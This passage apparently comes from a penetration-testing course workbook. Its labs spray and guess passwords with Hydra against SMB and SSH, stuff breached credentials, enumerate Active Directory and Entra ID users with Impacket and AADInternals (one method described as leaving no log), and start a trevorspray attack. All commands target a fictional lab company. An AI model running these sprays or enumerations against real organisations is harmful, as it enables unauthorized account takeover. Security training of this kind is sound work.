After clicking "Next" a few times, you'll see the Outlook Web Access results. This is a site we can target with password guessing attacks that we'll talk about in the next section. GoWitness and similar screenshot tools make it easy for us to visually inspect scan results and identify potential targets to attack. This is especially helpful when we're scanning hundreds or thousands of systems.

![](SEC560_WorkBook1_page_104_Figure_0.jpeg)

#### Conclusion

In this lab, we've seen how Nmap OS fingerprinting and version scanning can gather information about operating system types and the versions of software running on target machines. This information is tremendously useful to a penetration tester in focusing an attack and using speci fic tools and exploits to gain access to a target environment.

We also learned how certain NSE scripts can provide better information about the target operating system than Nmap's OS detection, and that NetExec can enumerate the same kind of information for us from multiple protocols.

In addition, we used GoWitness to get a quick look at the websites available in the organization. This helps the penetration tester quickly identify interesting websites.

Finally, we used Netcat to do interact with plain text protocols to aid in version scanning, and even test for a vulnerability.

In this lab, we've explored several very useful Nmap Scripting Engine scripts, including those associated with SMB and SSH. The Nmap Scripting Engine is one of the most dynamic and useful features of Nmap, as it opens Nmap up to all kinds of vulnerability scanning and checking options across a large-scale environment.

## *Lab 2.2: Password Guessing*

#### Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

#### Objectives

- To use Hydra for a password spray attack against SMB on a Windows target •
- To use Hydra for a password guessing attack against SMB on a Windows target •
- To use Hydra for a password guessing attack against an SSH daemon •

#### Lab Setup

VM used:

Linux •

You should be able to ping 10.130.10.10 from the Linux VM:

```
ping -c 4 10 .130.10.10
```

#### Expected Results

```
sec560@560vm:~$ ping -c 4 10 .130.10.10
PING 10.130.10.10 (10.130.10.10) 56(84) bytes of data.
64 bytes from 10.130.10.10: icmp_seq=1 ttl=63 time=26.3 ms
64 bytes from 10.130.10.10: icmp_seq=2 ttl=63 time=27.4 ms
64 bytes from 10.130.10.10: icmp_seq=3 ttl=63 time=31.9 ms
64 bytes from 10.130.10.10: icmp_seq=4 ttl=63 time=26.2 ms
--- 10.130.10.10 ping statistics ---
```

4 packets transmitted, 4 received, 0% packet loss, time 3002ms rtt min/avg/max/mdev = 26.201/27.925/31.858/2.315 ms

#### Lab – Step-by-Step Instructions

We will now perform a password guessing lab against two target machines:

10.130.10.10 : A Linux web server •

10.130.10.4 : A Windows Domain controller •

Suppose also that we've been told that the target organization has a password policy that requires all passwords to be eight or more characters in length and to meet 3 of the 5 following criteria:

- Number •
- Uppercase •
- Lowercase •
- Special characters •
- Other characters •

This is a very standard policy. The "three out of five categories" is what Microsoft means by "complex" passwords.

That's our scenario. Let's attack it.

#### *1: Password Spray (SMB)*

Let's do a password spray, where we pick one password and a lot of usernames. This is a good technique when you have a large list of user accounts and you have to be careful of login policies locking out the account after too many failed password guesses.

Also, during a penetration test, usernames are not going to be handed to you on a silver platter.

Let's assume we know the format from the recon phase, and we determined the username format is first initial follow by the last name (we'll refer to this as "flast"). So Walt Disney would have the account wdisney. We don't know any of the legitimate accounts at this point. What we need to do is guess.

Some enterprising individual, extracted the list of names from Facebook and used that list to generate a list of names in the "flast" format.

We've provided the top 100 from that list in /opt/passwords/facebook-f.last-100.txt (The full list can be found on skullsecurity.org). Let's take a look at the first 10 usernames in the list.

### Command head /opt/passwords/facebook-f.last-100.txt Expected Results sec560@slingshot:~\$ head /opt/passwords/facebook-f.last-100.txt jsmith ssmith skhan msmith skumar csmith asmith jjohnson dsmith akhan

As you can see, Smith is a very common last name. We'll use this list for our initial password guessing in conjunction with some common bad (easily guessable) passwords.

Let's use this list with a common password, the SeasonYear format. Remember, Hiboxy is a North American company, so use the current season (Spring, Summer, Autumn, Winter) and the current year. For example, if it was currently Summer in 2025, you'd use the password Summer25 or Summer2025. If that doesn't work, try the next season (90 rotation may have required a change) as well as the previous season (the user may not have had to rotate yet).

Let's see what we find!

#### Note

Note: The passwords here are programmatically generated, so the actual password will vary based on when you are taking the class and when the infrastructure was built. We'll use the place holder SEASONYEAR in place of the real password.

Let's use hydra for this password spray (remember to replace SEASONYEAR with the current season in the northern hemisphere and the current year).

We'll use the following options:

- -L /opt/passwords/facebook-f.last-100.txt : Use a list of username •
- -p SEASONYEAR: Use the exact current SeasonYear password (ex: "Summer2024") •
- -m workgroup:{hiboxy} : We are connecting to a domain controller and we need to specify the domain (note: you need the {} ), •
- 10.130.10.4 : IP address of the domain controller (found with scanning) •
- smb2: Protocol •

#### Command

Please replace SEASONYEAR in the following command to the current season and year in the northern hemisphere, such as Summer2024.

hydra -L /opt/passwords/facebook-f.last-100.txt -p SEASONYEAR-m workgroup:{ hiboxy} 10 .130.10.4 smb2

#### Expected Results

sec560@560vm:~\$ hydra -L /opt/passwords/facebook-f.last-100.txt -p Summer2025-m workgroup:{ hiboxy} 10.130.10.4 smb2

Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-18 00:59:38 [DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:100/p:1), ~7 tries per task

[DATA] attacking smb2://10.130.10.4:445/workgroup:{hiboxy}

[WARNING] 10.130.10.4 might accept any credential

[445][smb2] host: 10.130.10.4 login: alee password: Summer2025

1 of 1 target successfully completed, 1 valid password found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-18 00:59:41

Great! We found the password for alee !

By the way, you would have found this user by looking at the main website's about page !

In the real world, we'd wait until the longest observation window expired before trying another password guess. If we go too quickly we risk locking out users and causing a denial of service. Since this is a lab environment, we've disabled account lockout to make the lab more reliable and stable.

Try a few more more options:

- Next season •
- Previous season •
- This SeasonYear with added a ! to the end •
- Next SeasonYear with added a ! to the end •
- Previous SeasonYear with added a ! to the end •

You should find the password for a number of users. Expand the box below to see the users' passwords you should have found.

![](SEC560_WorkBook1_page_109_Figure_7.jpeg)

#### *2: The dictionary*

Password guessing lists are going to be much shorter than password lists used for cracking. We'll discuss cracking later in this course. Password guessing requires that we interact with a remote service, which will be slower. Also, we don't want to go too fast to cause a denial of service. Plus, online password attacks can be subject to lockouts, so we need to be careful. We have disabled lockouts so you (and other students) don't cause an issue with the lab.

To make things easier, we're going to generate a very simple list of passwords containing season and year, as well as things like Password1 and Welcome1. With minor modi fications, this little one-liner will generate a useful, simple list of common bad passwords for any penetration test.

```
for Y in 1 24 25 26; do printf '%s\n' { Password,Welcome,Spring,Summer,Fall,Autumn,Winter }"$Y"{ , \!}
| tee -a simple.txt ; done
```

#### Expected Results

```
sec560@560vm:~$ forY in 1 24 25 26; do printf '%s\n'
{ Password,Welcome,Spring,Summer,Fall,Autumn,Winter }"$Y"{ , \!} | tee -a simple.txt ; done
Password1
Password1!
Welcome1
Welcome1!
... truncated for brevity ...
Summer26
Summer26!
Fall26
Fall26!
Autumn26
Autumn26!
Winter26
Winter26!
```

#### Click here to see a break down of that one-liner.

- Let's start by explaining printf '%s\n' {Password,Welcome,Spring,Summer,Fall,Autumn,Winter} 1.
  - %s\n is the format string. %s prints one argument as text. \n prints a newline. **•**
  - printf applies that format to each argument it receives. Each brace-expanded token becomes a separate argument. **•**
  - Result: every word in {Password,Welcome,Spring,Summer,Fall,Autumn,Winter} is printed on its own line. **•**
- Now for \$Y and the for loop with numbers 2.
  - for Y in 1 24 25 26; do ...; done sets Y to 1 , then 24, then 25, then 26, in that order. **•**
  - On each iteration the brace expansion produces prefixes plus the current \$Y (for example Spring24). **•**
  - Because printf prints each argument on a new line, all items for that year are emitted before the loop moves to the next year. **•**
- Finally, the exclamation mark {,\!} 3.
  - {,X} expands to two items: empty string and X. So {,\!} yields no-suffix and !-suffix versions. **•**
  - The ! is escaped with \ to avoid shell history expansion in interactive shells. **•**
  - Combined example for Y=24: you get Spring24 and Spring24!. **•**

Let's count the number of lines using wc -l .

# Command wc -l simple.txt Expected Results sec560@560vm:~\$ wc -l simple.txt 56 simple.txt

We have our simple password list ready to go. Let's start guessing!

#### *3: Password Guessing (SSH)*

With our customized password list in hand, we can now con figure Hydra for our first password guessing attack. We know one of the Linux admin's names is Bruce Green, so we'll use bgreen for password guessing.

Execute Hydra with the following settings:

- Username bgreen •
- Use the password list we just created •
- Single Target of 10.130.10.10 •
- Protocol is SSH •

hydra -l bgreen -P simple.txt 10.130.10.10 ssh

#### Expected Results

sec560@560vm:~\$ hydra -l bgreen -P simple.txt 10.130.10.10 ssh

Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-19 21:13:21

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

[DATA] max 16 tasks per 1 server, overall 16 tasks, 56 login tries (l:1/p:56), ~4 tries per task

[DATA] attacking ssh://10.130.10.10:22/

[22][ssh] host: 10.130.10.10 login: bgreen password: Password1

1 of 1 target successfully completed, 1 valid password found

[WARNING] Writing restore file because 3 final worker threads did not complete until end.

[ERROR] 3 targets did not resolve or could not be connected

[ERROR] 0 target did not complete

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-19 21:13:26

Notice the following line in the output.

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

Hydra warns us that SSH may rate limit and suggests we use 4 threads, instead of the default of 16. Hydra does use the default value for scanning.

#### *4: Verifying Access*

Now that we have this account, let's use hydra to see if we can use this credential on any of the Windows systems.

First, let's get a list of systems listening on port 445 (SMB). We'll run Nmap targeting only port 445 and save the output to 445.tcp .

# Command nmap -n -PS445 -p 445 --open 10.130.10.0/24 -oG - | awk'/Up/ { print \$2 }' | tee 445.tcp Expected Results sec560@560vm:~\$ nmap -n -PS445 -p 445 --open 10.130.10.0/24 -oG - | awk'/Up/ { print \$2 }' | tee 445.tcp 10.130.10.4 10.130.10.5 10.130.10.7 10.130.10.21 10.130.10.23 10.130.10.25 10.130.10.44

Let's use hydra to see if these credentials are valid on the Windows systems.

hydra -m workgroup:{ hiboxy} -l bgreen -p Password1 -M 445.tcp smb2

#### Expected Results

sec560@560vm:~\$ hydra -m workgroup:{ hiboxy} -l bgreen -p Password1 -M 445.tcp smb2 Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-18 01:26:15 [DATA] max 1 task per 7 servers, overall 7 tasks, 1 login try (l:1/p:1), ~1 try per task [DATA] attacking smb2://(7 targets):445/workgroup:{hiboxy} [WARNING] 10.130.10.23 might accept any credential [WARNING] 10.130.10.4 might accept any credential [WARNING] 10.130.10.25 might accept any credential [WARNING] 10.130.10.7 might accept any credential [445][smb2] host: 10.130.10.23 login: bgreen password: Password1 [445][smb2] host: 10.130.10.4 login: bgreen password: Password1 [445][smb2] host: 10.130.10.25 login: bgreen password: Password1 [445][smb2] host: 10.130.10.7 login: bgreen password: Password1 [WARNING] 10.130.10.5 might accept any credential

[WARNING] 10.130.10.44 might accept any credential [445][smb2] host: 10.130.10.5 login: bgreen password: Password1 [WARNING] 10.130.10.21 might accept any credential [445][smb2] host: 10.130.10.44 login: bgreen password: Password1 [445][smb2] host: 10.130.10.21 login: bgreen password: Password1 7 of 7 targets successfully completed, 7 valid passwords found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-18 01:26:1

Why does it look like this account has access to all these Windows systems? Remember, all we are doing is determining if the domain account credentials are valid. This check does NOT check if the user has administrative access to these remote machines. To perform this type of check we need to use a tool, such as Find-LocalAdminAccess from PowerSploit, Metasploit's smb\_login module, or NetExec.

Additionally, by logging on to each of these remote machines, if we had the wrong password this would cause a failed logon attempt once per target machine, increasing the likelihood of locking out target machines.

#### *5: Breached Credentials*

As discussed earlier in the course, we like to look for breached credentials during the recon phase. We've provided results from a (simulated) search for such credentials. Let's take a look at the list located at /opt/passwords/hiboxy-breach.txt .

wc -l /opt/passwords/hiboxy-breach.txt head !\$

#### Expected Results

sec560@560vm:~\$ wc -l /opt/passwords/hiboxy-breach.txt 22 /opt/passwords/hiboxy-breach.txt sec560@560vm:~\$ head !\$

head /opt/passwords/hiboxy-breach.txt

abaird:Kstar123

aschmitt:Annika0410

bking:ThaBoss1

bking:David1993!

bwalker:Powder05

bwalker:CoDy8k65

ckhan:Panther101

csmith:Love\_12345

cstone:Audrianna2

ejohnson:Connor2001

The !\$ parameter after head is a handy bash trick to grab the last argument from the previous command. In this case, those two characters save us typing the 32 characters in "/opt/passwords/hiboxy-breach.txt".

The username and password are separated by a colon ( : ) so we can use it with Hydra. Let's use these passwords with Hydra to see which, if any, are valid.

Use the -C option with Hydra to test the specified credentials. It will try only the combinations specified.

hydra -C /opt/passwords/hiboxy-breach.txt 10.130.10.4 -m workgroup:{ hiboxy} smb2

#### Expected Results

sec560@560vm:~\$ hydra -C /opt/passwords/hiboxy-breach.txt 10.130.10.4 -m workgroup:{ hiboxy} smb2 Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-18 01:41:11 [DATA] max 16 tasks per 1 server, overall 16 tasks, 22 login tries, ~2 tries per task [DATA] attacking smb2://10.130.10.4:445/workgroup:{hiboxy}

[WARNING] 10.130.10.4 might accept any credential

[WARNING] 10.130.10.4 might accept any credential

[445][smb2] host: 10.130.10.4 login: jmartin password: Quincy626

[445][smb2] host: 10.130.10.4 login: bking password: ThaBoss1

1 of 1 target successfully completed, 2 valid passwords found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-18 01:41:12

We've found two of the breached credentials still work in our domain!

#### *6: Password Spraying all domain users*

Now that we have at least one valid domain credential, we can extract a full list of users. We'll use GetADusers.py from Impacket. We'll discuss Impacket more in 560.4. We need to provide the credentials in a user:password format. We also need to specify the IP address of the domain controller ( -dc-ip ) and tell the tool to get a list of all users with -all . We'll display the output on the screen and save the output with tee .

GetADUsers.pyhiboxy.com/bgreen:Password1-dc-ip 10.130.10.4 -all | tee adusers.txt

#### Expected Results

sec560@560vm:~\$ GetADUsers.pyhiboxy.com/bgreen:Password1-dc-ip 10.130.10.4 -all | tee adusers.txt

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[\*] Querying 10.130.10.4 for information about domain.

Name Email PasswordLastSet

LastLogon

-------------------- ------------------------------ -------------------

-------------------

Administrator Administrator@hiboxy.com 2025-09-15 02:25:43.959177

2025-09-17 15:23:01.980017

Guest <never>

<never>

SROCAdmin 2025-09-15 02:17:12.621569

<never>

krbtgt 2025-09-15 02:24:29.786640

<never>

SVC\_SQLService SVC\_SQLService@hiboxy.com 2025-09-15 02:25:54.013729

<never>

SVC\_SQLService2 2025-09-15 02:25:54.170312

2025-09-17 23:09:44.980761

krosterman 2025-09-15 02:25:54.232918

<never>

smorgan smorgan@hiboxy.com 2025-09-15 02:25:54.311235

<never>

sroc.admin 2025-09-15 02:25:54.373850

2025-09-18 01:46:07.176181

tduncan 2025-09-15 02:25:54.436520

<never>

antivirus antivirus@hiboxy.com 2025-09-15 02:25:56.018012

2025-09-17 19:55:20.895052

aallen aallen@hiboxy.com 2025-09-15 02:25:56.096281

<never>

...truncated for brevity...

Let's extract the list of users. Looking at the output above, we need to skip the first 5 lines then get the first item on each line. We'll use tail -n +6 to skip the first 5 lines, then cut to get the first column.

```
tail -n +6 adusers.txt | cut -d ' ' -f 1 | tee domainusers.txt
```

#### Expected Results

```
sec560@560vm:~$ tail -n +6 adusers.txt | cut -d ' ' -f 1 | tee domainusers.txt
Administrator
Guest
SROCAdmin
krbtgt
SVC_SQLService
SVC_SQLService2
krosterman
smorgan
sroc.admin
tduncan
...truncated for brevity...
```

Now that we have a list of domain users, let's try spraying with Password1.

#### Command

hydra -L domainusers.txt -p Password1-m workgroup:{ hiboxy} 10 .130.10.4 smb2

#### Expected Results

sec560@560vm:~\$ hydra -L domainusers.txt -p Password1-m workgroup:{ hiboxy} 10 .130.10.4 smb2 Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-18 02:01:27 [DATA] max 16 tasks per 1 server, overall 16 tasks, 572 login tries (l:572/p:1), ~36 tries per task

[DATA] attacking smb2://10.130.10.4:445/workgroup:{hiboxy}

[WARNING] 10.130.10.4 might accept any credential

[445][smb2] host: 10.130.10.4 login: bgreen password: Password1

[WARNING] 10.130.10.4 might accept any credential

[445][smb2] host: 10.130.10.4 login: jcooper password: Password1

1 of 1 target successfully completed, 2 valid passwords found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-18 02:01:40

Remember, those two users may have different group memberships, permissions, etc. In a real engagement, you might try regathering BloodHound data as each user to see if you have new administrative permissions, marking them as "owned" inside the BloodHound UI, and reviewing their group memberships to see if they have any additional permissions (such as to internal file shares or applications).

In the real world, you'd wait until the lockout observation window expired, and then try again. Since this is a lab with lockout disabled, try again with a few other passwords:

#### Password1! •

- CurrentSeasonYear (use the current season in the northern hemisphere, such as Autumn2024) •
- NextSeasonYear •
- PreviousSeasonYear •
- CurrentSeasonYear! •
- NextSeasonYear! •
- PreviousSeasonYear! •

The passwords you'll find are below.

#### Passwords Found

You should have found these passwords. We've included the other passwords from the breach list for a full list of guessed credentials.

| User       | Password                 |
|------------|--------------------------|
| alee       | Current Season Year      |
| bgreen     | Password1                |
| bking      | ThaBoss1                 |
| bsanchez   | Current Season Year + !  |
| bwebster   | Current Season Year      |
| hmarsh     | Previous Season Year     |
| janderson  | Next Season Year         |
| jcooper    | Password1                |
| jlopez     | Previous Season Year + ! |
| jmartin    | Quincy626                |
| kacevedo   | Current Season Year + !  |
| mhernandez | Password1!               |
| mluna      | Previous Season Year     |
| nlopez     | Next Season Year         |
| rduran     | Current Season Year + !  |
| ssmith     | Next Season Year + !     |

The season listed above may be off if you're taking the class very close to a season change.

#### Conclusion

In this lab we performed a password spray attack using a list of users and a single password. We also performed a password guessing attack against SSH with a list of passwords. Finally, we tested breached passwords against the domain to find even more valid credentials.

These techniques combined together are immensely useful to a penetration tester because they can provide a password into a target environment. That access may be the initial entry point into a target system, which the penetration tester can then use to plunder and pivot.

## *Lab 2.3: Azure Recon and Password Attacks*

#### Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

#### Objectives

- To use AADInternals Modules to perform Domain Reconnaissance •
- To use AADInternals Module for single username harvesting •
- To use AADInternals Module to harvest a large number of users •
- To use trevorspray for password attacks, using a limited password spraying attack •

#### Lab Setup

VMs used:

- Linux •
- Windows 11 •

To ensure all the steps of this lab work correctly, please run the following commands on your Linux system prior to beginning:

# Command rm -rf ~/.trevorspray 2>/dev/null grep -q autodiscover /etc/hosts || { sudo cp /etc/hosts /etc/hosts.bak && echo "10.130.10.25 autodiscover.hiboxy.com" | sudo tee -a /etc/hosts ; }

#### Lab – Step-by-Step Instructions

In our first look at Azure, we'll begin by performing some reconnaissance and password-based attacks. The MITRE ATT&CK® framework would categorize our Tactics as Reconnaissance (TA0043) and Initial Access (TA0001). In this lab, we will be focusing our efforts on several objectives, which include:

- Looking for valid and invalid domains hosted in Entra ID •
- Looking for good and invalid accounts that exist in that directory •
- Attacking those accounts with a known list of passwords, using techniques such as password spraying in the process •
- Using the cloud to identify on-premise systems to attack •

#### *1: Loading AADInternals*

In the Windows 11 VM we will start with the AADInternals's AAD and M365 Kill Chain sections to scan as an outsider.

To launch AADInternals tools, open a PowerShell prompt and run the following commands.

![](SEC560_WorkBook1_page_122_Picture_11.jpeg)

#### *2: Invoke-AADIntReconAsOutsider*

Next, we will use one of the modules to perform reconnaissance. Several modules can help us through this process. The tools included in AADInternals allow reconnaissance as an Internal User, as a Guest user, and as a complete outsider. We have no known credentials; as such, we will set this up to use AADIntReconAsOutsider. One step this tool used to do is enumerate other domains associated with Azure and M365 tenants. Commonly, a domain like hiboxy.com will also have an \*.onmicrosoft.com and a \*.mail.onmicrosoft.com . AADInternals used to enumerate them all. Microsoft recently changed the behavior of the Get-FederationInformation cmdlet in Microsoft Exchange Online.

The behavior change causes an error in AADInternals, which we'll redirect with errors with 2>\$null . It also prevents the tool from enumerating the other domains. You can easily do it yourself by using nslookup and prepending hiboxy and hiboxy.com to the .onmicrosoft.com domains above.

#### There is an open pull request to address the error.

The error is generated because a blank string is returned when it is expecting a domain. One of the course authors has submitted a pull request to handled the error more elegantly than redirecting it with 2>\$null .

Invoke-AADIntReconAsOutsider -DomainName hiboxy.com2>\$null | Format-Table Invoke-AADIntReconAsOutsider -DomainName hiboxy.onmicrosoft.com2>\$null| Format-Table Invoke-AADIntReconAsOutsider -DomainName hiboxy.mail.onmicrosoft.com 2>\$null| Format-Table

#### Expected Results

PS C:\Users\sec560> Invoke-AADIntReconAsOutsider -DomainName hiboxy.com 2>\$null | Format-Table

Tenant brand: Hiboxy

Tenant name:

Tenant id: 1c0060e4-c4db-4777-a48b-34a1515e33bf

Tenant region: NA DesktopSSO enabled: False WARNING: Requests throttled! Uses cloud sync: True

Name DNS MX SPF DMARC DKIM MTA-STS Type STS

---- --- -- --- ----- ---- ------- ---- ---

hiboxy.com True False False False False False Managed

PS C:\Users\sec560> Invoke-AADIntReconAsOutsider -DomainName hiboxy.onmicrosoft.com 2>\$null| Format-Table

Tenant brand: Hiboxy

Tenant name: hiboxy.onmicrosoft.com

Tenant id: 1c0060e4-c4db-4777-a48b-34a1515e33bf

Tenant region: NA DesktopSSO enabled: False

Name DNS MX SPF DMARC DKIM MTA-STS Type STS

---- --- -- --- ----- ---- ------- ---- ---

hiboxy.onmicrosoft.com True True True False False False Managed

PS C:\Users\sec560> Invoke-AADIntReconAsOutsider -DomainName hiboxy.mail.onmicrosoft.com 2>\$null| Format-

Table

Tenant brand: Hiboxy

Tenant name:

Tenant id: 1c0060e4-c4db-4777-a48b-34a1515e33bf

Tenant region: NA DesktopSSO enabled: False WARNING: Requests throttled! Uses cloud sync: True

Name DNS MX SPF DMARC DKIM MTA-STS Type STS

---- --- -- --- ----- ---- ------- ---- ---

hiboxy.mail.onmicrosoft.com True True True False False False Managed

#### Apple silicon users...

When run on an Apple silicon system, the output for this tool is not consistent with the actual settings. Please refer to the results above, and know that this tool isn't reliable on an Apple silicon system.

There are several items to note that we would want to consider in part of our attack scenario now. First, observe that hiboxy.com appears to be the primary tenant domain. There are several original domains that exist. hiboxy.onmicrosoft.com may be the original Tenant Name. Knowing this 'pattern' may reveal other services with similar names. Second, look at what is and is not enabled. DesktopSSO, which can enable single sign-on, is not enabled. Not having the feature enabled means that the AZUREADSSOACC computer account is not on the On-Premises domain and may not be available for us to use as an attack vector. It also appears that mail settings have not been hardened. There is no SPF record for hiboxy.com, and no DMARC record exists for any domain.

#### *3: Invoke-AADIntUserEnumerationAsOutsider*

Now that we have a valid domain, we can target users for enumeration. In a real engagement, you'd want to pull together all of the usernames and email addresses you might have enumerated during the renaissance phase. We can provide Invoke-AADIntUserEnumerationAsOutsider to determine if a username or email address is valid at the tenant.

![](SEC560_WorkBook1_page_125_Figure_3.jpeg)

There are 3 APIs that this module hits for the attack:

- Normal (Not speci fied): GetCredentialType API •
- Login: Attempts a standard user log in; attempts are logged in Sign-In Logs •
- Autologon: Uses the autologon API; this API does not leave a log event •

Invoke-AADIntUserEnumerationAsOutsider-UserName"aparker@hiboxy.com"-Method Login

#### Expected Results

PS C:\Users\sec560> Invoke-AADIntUserEnumerationAsOutsider-UserName"aparker@hiboxy.com" - MethodLogin

UserNameExists ------------- aparker@hiboxy.comTrue

This is sufficient to look for one user, but what about a larger list of users?

#### *4: Username Harvesting Attacks*

If you were not able to discover a good list of users or email addresses during recon, you could use the Statistically Likely Usernames project. We know Hiboxy's email pattern is {fi}{last}@hiboxy.com . This is how we could use the project to enumerate users. Note: Do not run this command. It would take a long time to run.

#### Statistically Likely Usernames Example

curl -O https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/refs/ heads/master/jsmith.txt gc .\jsmith.txt | %{ \$\_ + "@hiboxy.com"} | Invoke-AADIntUserEnumerationAsOutsider | Where-Object Exists | Select-Object UserName

There are over 48,000 potential usernames in jsmith.txt . If we did them one at a time, and each takes an average of 1 second, it would take over 13 hours to run. To shorten that up, we'll provide you a list of users.

The following command will require us to have a list of usernames. We will attempt to use those usernames on the hiboxy.com domain. We've made a shorter list to use during the lab, C:\CourseFiles\users.txt . In the real world, you would likely build this list during the recon phase, or create a threaded version of the enumeration technique above.

Let's take a look at the list of users.

cd C:\CourseFiles\

Get-Content users.txt

#### Expected Results

PS C:\Users\sec560> cd C:\CourseFiles\ PS C:\CourseFiles> Get-Content .\users.txt abates@hiboxy.com

alee@hiboxy.com

aparker@hiboxy.com

bgreen@hiboxy.com

bking@hiboxy.com

bsanchez@hiboxy.com

bwebster@hiboxy.com

hmarsh@hiboxy.com

janderson@hiboxy.com

jcooper@hiboxy.com

jlopez@hiboxy.com

jmartin@hiboxy.com

kacevedo@hiboxy.com

mhernandez@hiboxy.com

mlara@hiboxy.com

mluna@hiboxy.com

nlopez@hiboxy.com

rduran@hiboxy.com

rgray@hiboxy.com

slopez@hiboxy.com

ssmith@hiboxy.com

Run Invoke-AADIntUsrEnumerationAsOutsider with these users; this will leave a log trail without specifying a type of authentication.

#### Command Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider Expected Results PS C:\CourseFiles> Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider UserName Exists -------- ----- abates@hiboxy.com True alee@hiboxy.com False aparker@hiboxy... True bgreen@hiboxy.com False bking@hiboxy.com False bsanchez@hibox... False bwebster@hibox... False hmarsh@hiboxy.com False janderson@hibo... False jcooper@hiboxy... False jlopez@hiboxy.com False jmartin@hiboxy... False kacevedo@hibox... False mhernandez@hib... False mlara@hiboxy.com True mluna@hiboxy.com False nlopez@hiboxy.com False rduran@hiboxy.com False rgray@hiboxy.com False slopez@hiboxy.com True

We've provided a small list here that you can complete in a more reasonable amount of time for this lab:

ssmith@hiboxy.com False

Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider| Where-Object Exists | Select-Object UserName |tee-object hiboxy-users.txt

#### Expected Results

PS C:\CourseFiles> Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider | Where-Object Exists | Select-Object UserName | tee-object hiboxy-users.txt

#### UserName

--------

abates@hiboxy.com aparker@hiboxy.com mlara@hiboxy.com slopez@hiboxy.com

We'll perform the next steps from Linux. Switch over to your SEC560 Linux VM to continue.

#### *5: Prepare the Attack on Linux*

From your Linux system we'll use smbclient to download the files we've been working with. First, let's create a folder for our user files and cd into it.

#### Command

mkdir users && cd users

#### Expected Results

sec560@560vm:~\$ mkdir users && cd users sec560@560vm:~/users\$

Replace WINDOWS\_ETHERNET0\_IP with your Windows Ethernet0 IP address.

smbclient //WINDOWS\_ETHERNET0\_IP/C\$-U 'sec560%sec560'-c 'cd CourseFiles; get users.txt'

#### Expected Results

sec560@560vm:~/users\$ smbclient //192.168.188.145/C\$ -U 'sec560%sec560'-c 'cd CourseFiles; get users.txt'

getting file \CourseFiles\users.txt of size 407 as users.txt (198.7 KiloBytes/sec) (average 198.7 KiloBytes/sec)

#### Command Breakdown

- smbclient //192.168.188.145/C\$ Connects to the C\$ administrative share on the machine with the IP 192.168.188.145. A hostname can also be used. •
- -U 'sec560%sec560' Supplies the username (sec560) and password (sec560) for authentication. The % separates them. •
- -c ' ... ' Runs the given commands non-interactively inside smbclient and then exits. •
- cd CourseFiles; Changes into the remote directory CourseFiles on the share. •
- get users.txt Downloads the users.txt file. •

After we enumerate new users, we should check breach data to see if those accounts are a part of another breach. For the sake of the lab, we found a password for each of the four users.

|   | Q | hiboxy.com         |                      |
|---|---|--------------------|----------------------|
|   |   |                    |                      |
|   |   | abates@hiboxy.com  | <b>⊜</b> Collections |
|   |   |                    |                      |
|   |   | aparker@hiboxy.com | <b>⊜</b> Canva.com   |
|   |   |                    |                      |
|   |   | mlara@hiboxy.com   | <b>Z</b> ynga.com    |
|   |   |                    |                      |
|   |   | slopez@hiboxy.com  | ShareThis.com        |
| · |   |                    |                      |

Let's create a creds file to use in credential stuffing.

cat << EOF > valid.creds abates@hiboxy.com:Metallica6 aparker@hiboxy.com:Oozle11 mlara@hiboxy.com:Packardbell350 slopez@hiboxy.com:Tibbetts3 EOF

#### Expected Results

sec560@560vm:~/users\$ cat << EOF > valid.creds abates@hiboxy.com:Metallica6 aparker@hiboxy.com:Oozle11 mlara@hiboxy.com:Packardbell350 slopez@hiboxy.com:Tibbetts3 EOF sec560@560vm:~/users\$

#### Curious about the cat << EOF syntax?

This technique is what's called a "here document", or sometimes just "heredoc". The << is a shell operator that allows you to redirect the contents of a file to a command. In this case, we are using it to create a file with the contents of the usernames. The EOF is a delimiter that tells the shell where the end of the file is. You can use any string you like, but EOF is a common choice. After the lab, you can learn more about heredocs in the Bash man page ( man bash) and searching for "here documents" ( /here documents).

#### *6: Password Attack*

We will be using trevorspray from our Linux VM for the password spraying attack.

First, let's get the usage:

trevorspray --help

#### Expected Results

sec560@560vm:~\$ trevorspray --help

```
[INFO] Command: /usr/local/bin/trevorspray --help
usage: trevorspray [-h] [-m {jumpcloud,adfs,auth0,owa,anyconnect,okta,msol}]
 [-up USERPASS [USERPASS ...]] [-u USERS [USERS ...]]
